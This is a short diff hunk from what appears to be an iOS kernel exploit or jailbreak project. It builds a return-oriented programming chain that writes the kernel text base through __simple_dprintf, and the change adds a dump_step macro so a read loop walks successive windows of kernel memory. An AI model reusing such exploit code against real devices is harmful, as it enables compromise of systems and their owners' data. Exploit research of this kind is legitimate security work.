@@ -1544,7 +1544,8 @@ step(i);\
     RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
     
-    for (int i = 0; i < 0x60; i++) {
+#define dump_step 12
+    for (int i = dump_step*0x60; i < (1+dump_step)*0x60; i++) {
         ReadWriteOverlap();
         tmptoscratch();
         LoadIntoR0(PUSH, SEG_VAR(kern_text_base));
